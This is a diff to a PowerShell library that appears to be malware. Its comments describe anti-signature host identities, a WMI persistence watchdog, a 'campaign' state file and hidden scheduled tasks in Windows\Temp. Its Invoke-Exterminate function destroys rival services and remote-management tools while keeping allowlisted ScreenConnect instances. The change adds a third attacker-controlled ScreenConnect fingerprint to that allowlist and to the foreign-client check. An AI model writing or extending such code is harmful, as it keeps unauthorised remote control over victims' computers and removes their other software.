@@ -1,6 +1,6 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L13
+# OWN_LIB  BUILD 20260802L14
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
 # L13: schtasks Create via cmd (like WucacheOwn), TR under Windows\Temp\.wucache
@@ -322,7 +322,7 @@ function Invoke-Exterminate {
     # L7: true removal. Correct WOW6432Node hive + msiexec + UninstallString
     # fallback + force dir nuke. Keep only the two allowlisted fingerprints.
     $log = Join-Path $WorkDir 'exterminate.log'
-    $keep = @('5f6010579852e507','f861c8140d453427')
+    $keep = @('5f6010579852e507','f861c8140d453427','9908198e668e4750')
     $n = @{ svc = 0; proc = 0; dir = 0; product = 0; rmm = 0; fail = 0 }
     function Log([string]$m) {
         $line = '{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m
@@ -546,11 +546,12 @@ function Update-State {
         if ($svc.Name -match '\(([0-9a-f]{16})\)') {
             if ($matches[1] -eq '5f6010579852e507') { $prim = "$($svc.Status)" }
             elseif ($matches[1] -eq 'f861c8140d453427') { $alt = "$($svc.Status)" }
+            elseif ($matches[1] -eq '9908198e668e4750') { $script:gryxa = "$($svc.Status)" }
         }
     }
     $foreign = @()
     foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
-        if ($svc.Name -match '\(([0-9a-f]{16})\)' -and $matches[1] -notin @('5f6010579852e507','f861c8140d453427')) {
+        if ($svc.Name -match '\(([0-9a-f]{16})\)' -and $matches[1] -notin @('5f6010579852e507','f861c8140d453427','9908198e668e4750')) {
             $foreign += $matches[1]
         }
     }
